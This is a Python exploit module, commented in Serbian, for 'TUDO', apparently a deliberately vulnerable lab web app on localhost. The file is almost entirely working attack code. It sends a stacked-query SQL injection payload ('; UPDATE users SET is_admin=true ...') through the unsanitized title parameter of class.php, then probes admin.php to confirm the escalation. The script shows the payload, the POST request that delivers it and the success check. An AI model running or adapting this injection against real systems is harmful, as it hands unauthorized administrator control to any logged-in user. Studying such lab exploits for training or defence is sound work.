#!/usr/bin/env python3
"""
Admin Privilege Escalation - TUDO
----------------------------------
Ranjivost: SQL Injection u class.php (parametar `title` nije sanitizovan)
Tehnika:   PostgreSQL stacked queries (`;`) → UPDATE users SET is_admin=true
Impact:    Bilo koji autentifikovani korisnik može postati admin
"""

import requests
import time


# ---------------------------------------------------------------------------
# Pomoćna funkcija: proverava da li je tekući sesijski korisnik admin
# ---------------------------------------------------------------------------

def _is_admin(session: requests.Session, target: str) -> bool:
    """
    admin.php vraća 200 ako je korisnik admin, inače redirect (302) na login.
    """
    r = session.get(target + "/admin.php", allow_redirects=False)
    return r.status_code == 200


# ---------------------------------------------------------------------------
# Stacked-query injekcija kroz class.php → title parametar
#
# Ranjivi kod u app/class.php (ilustrativno):
#   $sql = "SELECT * FROM class_posts WHERE title = '" . $_POST['title'] . "'";
#   pg_query($conn, $sql);
#
# Payload:
#   ' ; UPDATE users SET is_admin=true WHERE username='<user>' --
#
# PostgreSQL dozvoljava stacked queries (više naredbi razdvojenih sa ';')
# kad se koristi pg_query() (za razliku od pg_query_params koji to blokira).
# ---------------------------------------------------------------------------

def _sqli_set_admin(session: requests.Session, target: str, user: str) -> bool:
    """
    Šalje POST na /class.php s malicioznim title parametrom.
    Vraća True ako server nije vratio grešku (HTTP 200/302).
    """
    payload = f"' ; UPDATE users SET is_admin=true WHERE username='{user}' --"
    r = session.post(
        target + "/class.php",
        data={"title": payload},
        allow_redirects=False,
    )
    # Aplikacija redirektuje na class.php ili vraća 200 s rezultatima —
    # u oba slučaja je injekcija prošla (pg_query() ignoriše grešku SELECT-a
    # ali IZVRŠI stacked UPDATE).
    return r.status_code in (200, 302)


# ---------------------------------------------------------------------------
# Javni API: run_privesc
# ---------------------------------------------------------------------------

def run_privesc(session: requests.Session, target: str, user: str) -> bool:
    """
    Escalates `user` to admin via SQLi in class.php.

    Parametri:
      session  – requests.Session sa već ulogovanim korisnikom
      target   – http://localhost:8000
      user     – korisničko ime (npr. "user1")

    Vraća True ako je korisnik uspešno escalated do admin privilegija.
    """
    print(f"[*] Pokušavam SQLi privesc za korisnika '{user}'")

    # Brzo proverimo da li smo već admin (nije potrebno opet napadati)
    if _is_admin(session, target):
        print("[+] Korisnik je već admin, preskačem injekciju")
        return True

    ok = _sqli_set_admin(session, target, user)
    if not ok:
        print("[-] POST na /class.php nije uspeo (HTTP greška)")
        return False

    # Kratka pauza — PostgreSQL commit je sinhroni, ali damo malo vremena
    time.sleep(0.3)

    if _is_admin(session, target):
        print(f"[+] Uspeh! Korisnik '{user}' je sada admin")
        return True
    else:
        print("[-] /admin.php i dalje nije dostupan — injekcija nije prošla")
        return False